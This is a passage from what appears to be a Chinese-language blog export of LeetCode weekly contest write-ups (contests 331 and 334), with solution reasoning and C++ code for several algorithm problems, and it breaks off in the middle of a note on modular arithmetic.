                <span class="token operator">++</span>p2<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>p1 <span class="token operator">&lt;</span> nums1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">++</span>p1<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>p2 <span class="token operator">&lt;</span> nums2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> nums2<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums2<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">++</span>p2<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="将整数减少到零需要的最少操作数"><a href="#将整数减少到零需要的最少操作数" class="headerlink" title="将整数减少到零需要的最少操作数"></a>将整数减少到零需要的最少操作数</h1><h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/minimum-operations-to-reduce-an-integer-to-0/">将整数减少到零需要的最少操作数</a></p>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>本题我最开始想往位运算的思路上出发，但无法得到一个有效的解法。</p>
<p>最后在题目示例中发现一个规律：要想使得操作次数最小，每次需要减去或加上离当前正整数 n 最近的 2 的幂数，而该幂数可能是第一个大于 n 的幂数，或是第一个小于 n 的幂数，若 n 本身就是 2 的幂数，则操作次数为 1。</p>
<p>由此可想到利用递归分治的思想，若第一个大于 n 的幂数为 n1，第一个小于 n 的幂数为 n2，使 n 等于 0 需要执行的最少操作数为： 使得 n1 - n 等于 0 和 使得 n - n2 等于 0 需要执行得最少操作次数中得较小值加上 1，即 <code>minOperations(n) = min(minOperations(n1 - n), minOperations(n - n2)) + 1</code>.</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">int</span> <span class="token function">minOperations</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> n1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>n1 <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            n1 <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>n1 <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> n2 <span class="token operator">=</span> n1 <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">minOperations</span><span class="token punctuation">(</span>n1 <span class="token operator">-</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">minOperations</span><span class="token punctuation">(</span>n <span class="token operator">-</span> n2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode周赛总结 第331场</title>
    <url>/2023/02/05/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC331%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="从数量最多的堆取走礼物"><a href="#从数量最多的堆取走礼物" class="headerlink" title="从数量最多的堆取走礼物"></a>从数量最多的堆取走礼物</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/take-gifts-from-the-richest-pile/">从数量最多的堆取走礼物</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接按照流程模拟即可，将数组 gifts 的元素放入优先队列中，然后每次从中选出最大值 maxGift，再将 sqrt(maxGift) 放回队列，重复 k 次，计算队列剩余的值总和。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">pickGifts</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> gifts<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 这里求 gifts 总和要注意累加初始值定义为 0ll（long long 类型），否则 int 可能溢出</span>
        <span class="token comment">// 当然也可以不求初始总数量，而在循环结束后直接统计剩余的数量</span>
        <span class="token keyword">long</span> <span class="token keyword">long</span> sum <span class="token operator">=</span> <span class="token function">accumulate</span><span class="token punctuation">(</span>gifts<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> gifts<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0ll</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        priority_queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">Q</span><span class="token punctuation">(</span>gifts<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> gifts<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> <span class="token keyword">long</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> maxGift <span class="token operator">=</span> Q<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> maxSqrt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sqrt</span><span class="token punctuation">(</span>maxGift<span class="token punctuation">)</span><span class="token punctuation">;</span>
            res <span class="token operator">+=</span> maxGift <span class="token operator">-</span> maxSqrt<span class="token punctuation">;</span>
            Q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>maxSqrt<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> sum <span class="token operator">-</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="统计范围内的元音字符串数"><a href="#统计范围内的元音字符串数" class="headerlink" title="统计范围内的元音字符串数"></a>统计范围内的元音字符串数</h1><h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/count-vowel-strings-in-ranges/">统计范围内的元音字符串数</a></p>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>题目要求解多个区间的元音字符串个数，可以考虑使用<strong>前缀和</strong>的技巧：即指定一个前缀和数组 preSum，preSum[i] 表示区间 [0, i)（左闭右开）上元音字符串的个数，那么任意区间 [l, r] 的元音字符串个数为 preSum[r + 1] - preSum[l].</p>
<p>而求前缀和就比较简单了，从 i = 0 开始循环，如果字符串 words[i] 为元音字符串，则 preSum[i + 1] = preSum[i] + 1，否则 preSum[i + 1] = preSum[i].</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">vowelStrings</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> words<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> queries<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        unordered_set<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> alphaSet <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'u'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">=</span> words<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">preSum</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            string str <span class="token operator">=</span> words<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>alphaSet<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> alphaSet<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                preSum<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> preSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                preSum<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> preSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> queries<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> l <span class="token operator">=</span> queries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> queries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> cnt <span class="token operator">=</span> preSum<span class="token punctuation">[</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> preSum<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>
            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="重排水果"><a href="#重排水果" class="headerlink" title="重排水果"></a>重排水果</h1><h2 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/rearranging-fruits/">重排水果</a></p>
<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>由于交换两水果的成本为 min(basket1[i], basket2[i])，很容易想到的交换方法忽视两果篮中共有的水果，挨个让 basket1 中成本最大的水果和 basket2 中成本最小的水果进行交换。但事实上这样忽视了一种情况：假设 basket1 中有水果 …basket1[i]…basket1[j]…，basket2 中有水果 …basket2[i]…，如果 2 * basket1[j] &lt; min(basket1[i], basket2[i])，那么如果以 basket1[j] 为中介，分别与 basket2[i] 和 basket1[i] 交换，所花的代价更小，因此交换成本为 min(basket1[i], basket2[i], 2 * minVal).</p>
<p>具体代码实现部分，可以用哈希表记录 basket1 和 basket2 中各水果成本和相对数量（basket1 相对数量为正，basket2 相对数量为负）。统计完成后，分别将相对数量大于零的和相对数量小于零的成本值存放在两个数组中，分别升序排序和降序排序，按照上述交换方案计算总交换成本。</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">minCost</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> basket1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> basket2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        unordered_map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> fruitCnt<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> basket1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token operator">++</span>fruitCnt<span class="token punctuation">[</span>basket1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> basket2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token operator">--</span>fruitCnt<span class="token punctuation">[</span>basket2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">int</span> minVal <span class="token operator">=</span> INT32_MAX<span class="token punctuation">;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> fruits1<span class="token punctuation">,</span> fruits2<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> fc <span class="token operator">:</span> fruitCnt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> f <span class="token operator">=</span> fc<span class="token punctuation">.</span>first<span class="token punctuation">,</span> c <span class="token operator">=</span> fc<span class="token punctuation">.</span>second<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 若相对数量为奇数，则必定无法相等</span>
            minVal <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>minVal<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 一次交换使相对数量的绝对值减小2</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    fruits1<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    fruits2<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>fruits1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> fruits2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> <span class="token keyword">long</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token function">sort</span><span class="token punctuation">(</span>fruits1<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fruits1<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">less</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sort</span><span class="token punctuation">(</span>fruits2<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fruits2<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">greater</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fruits1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res <span class="token operator">+=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">min</span><span class="token punctuation">(</span>fruits1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> fruits2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> minVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode周赛总结 第334场</title>
    <url>/2023/02/26/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC334%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="左右元素和的差值"><a href="#左右元素和的差值" class="headerlink" title="左右元素和的差值"></a>左右元素和的差值</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/left-and-right-sum-differences/">左右元素和的差值</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接按照题目要求模拟即可，两次遍历求出 leftSum 和 rightSum，再计算得出 answer.</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">leftRigthDifference</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">leftSum</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            leftSum<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> leftSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">rightSum</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            rightSum<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> rightSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>leftSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> rightSum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="找出字符串的可整除数组"><a href="#找出字符串的可整除数组" class="headerlink" title="找出字符串的可整除数组"></a>找出字符串的可整除数组</h1><h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/find-the-divisibility-array-of-a-string/">找出字符串的可整除数组</a></p>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>n 的取值范围为 1 &lt;= n &lt;= 1e5，因此直接暴力求解显然是行不通的。</p>
<p>对于处理大整数除以某个数的余数的问题，有一些常见的公式可以用于简化运算：</p>
<ul>
<li>(a+b) mod n = ((a mod n)+ (b mod n)) mod n</li>
<li>(a-b) mod n = ((a mod n) - (b mod n)+n) mod n</li>
<li>ab mod n = (a mod n) (b mod n) mod n</li>
</ul>
